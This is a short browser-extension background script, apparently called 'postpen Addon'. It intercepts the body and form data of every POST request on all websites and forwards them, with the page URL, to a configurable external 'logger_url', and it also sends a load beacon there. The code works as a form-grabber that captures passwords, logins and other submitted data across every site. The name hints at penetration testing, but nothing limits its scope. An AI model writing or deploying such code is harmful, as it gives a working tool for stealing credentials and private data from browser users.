browser.webRequest.onBeforeRequest.addListener(
	(data) => {
		browser.storage.sync.get("logger_url").then(result=>{
			const logger_url = result.logger_url;
			if (data.method!=='POST') return;
			if (!data.requestBody) return; // ?
			const url = data.url;
			if (url==logger_url) return;
			console.info(data);
			const rawData = decodeURIComponent(String.fromCharCode.apply(null,new Uint8Array(data.requestBody.raw[0].bytes)));
			const formData = data.requestBody.formData;
			const formDataString = JSON.stringify({formData});
			const method = data.method;
			const redID = data.requestId;
			const loggerText = `url: ${url}\nrawData: ${rawData}\nformData: ${formDataString}`;
			fetch(logger_url,{ method:method, body:loggerText });
		},console.error);
	},
	{urls: ['<all_urls>']},
	['requestBody']
);

browser.storage.sync.get("logger_url").then((store)=>{
	const logger_url = store.logger_url;
	fetch(logger_url,{ method:'POST', body:'postpen Addon loaded', cache: 'no-cache'});
},console.error);